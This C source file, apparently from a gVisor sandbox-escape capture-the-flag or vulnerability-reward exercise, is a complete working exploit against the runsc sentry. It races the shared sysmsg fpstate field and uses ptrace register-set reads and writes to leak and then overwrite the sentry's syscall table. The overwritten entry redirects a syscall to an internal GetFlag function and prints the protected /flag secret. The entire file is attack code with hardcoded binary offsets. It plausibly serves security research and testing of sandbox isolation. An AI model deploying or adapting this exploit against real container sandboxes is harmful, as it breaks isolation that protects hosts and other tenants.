// Copyright 2023 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <errno.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

// readelf runsc -s -W | grep linux.GetFlag$
//  25712: 0000000000a610a0   118 FUNC    GLOBAL DEFAULT    1
//  gvisor.dev/gvisor/pkg/sentry/syscalls/linux.GetFlag
#define GetFlag_offset 0x0000000000a610a0

// objdump -M intel -D -j .data runsc | grep AMD64 -A 3
// 0000000001e64fd0 <gvisor.dev/gvisor/pkg/sentry/syscalls/linux.AMD64>:
//  1e64fd0:       20 c1                   and    cl,al
//  1e64fd2:       e7 01                   out    0x1,eax
//  1e64fd4:       00 00                   add    BYTE PTR [rax],al
#define AMD64_table_offset 0x0000000001e7c120

struct sysmsg {
  struct sysmsg *self;
  uint64_t ret_addr;
  uint64_t syshandler;
  uint64_t syshandler_stack;
  uint64_t app_stack;
  uint32_t interrupt;
  int32_t fault_jump;
  uint32_t type;
  uint32_t state;

  uint64_t sentry_addr;

  int32_t signo;
  int32_t err;
  int32_t err_line;
  uint64_t debug;
  struct user_regs_struct ptregs;
  uint64_t fpstate;
  siginfo_t siginfo;
  // tls is only populated on ARM64.
  uint64_t tls;
  uint32_t stub_fast_path;
  uint32_t sentry_fast_path;
  uint32_t acked_events;
};

enum {
  STEP_READ,
  STEP_WRITE,
  STEP_DONE,
};

typedef struct {
  int step;
  struct sysmsg *sysmsg;
  uint64_t msg_addr;
  int64_t fpstate;
  char fpregs[0xa80];
} shared_state;

shared_state *state;

void hexDump(const void *data, size_t size) {
  size_t i;
  for (i = 0; i < size; i++) {
    printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\n');
  }
  printf("\n");
}

void *race(void *arg) {
  while (1) {
    state->sysmsg->fpstate = state->fpstate;
  }
  return NULL;
}

void sighandler(int signum, siginfo_t *siginfo, ucontext_t *ucontext) {
  if (state->step == STEP_WRITE) {
    memcpy(ucontext->uc_mcontext.fpregs, state->fpregs, 0xa80);

    *(uint64_t *)((char *)ucontext->uc_mcontext.fpregs + 0x50 + 4 * 8) =
        AMD64_table_offset + 0x58 + 4 * 8 + 8;
    *(uint64_t *)((char *)ucontext->uc_mcontext.fpregs + 0x58 + 4 * 8 + 8) =
        GetFlag_offset;

    state->fpstate = -state->msg_addr + AMD64_table_offset;
    state->sysmsg->fpstate = -state->msg_addr + AMD64_table_offset;
  }
}

int main(int argc, char *argv[]) {
  state =
      (shared_state *)mmap((void *)0x41410000, 0x1000, PROT_READ | PROT_WRITE,
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  memset(state, 0, sizeof(shared_state));

  if (open("/flag", O_RDONLY) != -1 || errno != ENOENT) {
    printf("Secret flag must not be readable!\n");
    return 1;
  }

  pid_t pid = fork();
  if (pid == 0) {
    struct sysmsg *sysmsg;
    asm volatile("movq %%gs:0, %0\n" : "=r"(sysmsg) : :);

    state->sysmsg = sysmsg;
    state->msg_addr = state->sysmsg->sentry_addr;
    state->fpstate = -state->msg_addr + AMD64_table_offset;
    state->step = STEP_READ;

    pthread_t th;
    pthread_create(&th, NULL, race, NULL);

    signal(SIGUSR2, (void *)sighandler);

    while (1) {
      if (state->step == STEP_READ) {
        raise(SIGUSR1);
      } else if (state->step == STEP_WRITE) {
        raise(SIGUSR2);
        state->fpstate = 0xfffffffffffff540;

        // read flag
        char flag[128] = {};
        int read = syscall(SYS_stat, flag);
        if (read == 0x1337) {
          printf("%s\n", flag);
          fflush(stdout);
          state->step = STEP_DONE;
          raise(SIGSTOP);
        }
      }
    }
    exit(0);
  }

  ptrace(PTRACE_ATTACH, pid, NULL, NULL);

  while (1) {
    int status;
    waitpid(pid, &status, 0);

    if (state->step == STEP_DONE) break;

    if (WSTOPSIG(status) == SIGSTOP) {
      ptrace(PTRACE_CONT, pid, NULL, WSTOPSIG(status));
    } else if (WSTOPSIG(status) == SIGUSR1) {
      char leak[0xa80];
      memset(leak, 0, sizeof(leak));
      struct iovec iov;
      iov.iov_base = leak;
      iov.iov_len = sizeof(leak);
      if (ptrace(PTRACE_GETREGSET, pid, NT_X86_XSTATE, &iov) != 0) {
        perror("ptrace(PTRACE_GETREGSET)");
        fflush(stdout);
        return 1;
      }

      // race failed, retry
      if (*(uint64_t *)(leak + 0x00) == 0x37f) {
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        continue;
      }

      memcpy(state->fpregs, leak, sizeof(leak));
      state->step = STEP_WRITE;
      state->fpstate = 0xfffffffffffff540;
      ptrace(PTRACE_CONT, pid, NULL, NULL);
    } else if (WSTOPSIG(status) == SIGUSR2) {
      ptrace(PTRACE_CONT, pid, NULL, WSTOPSIG(status));
    }
  }

  return 0;
}
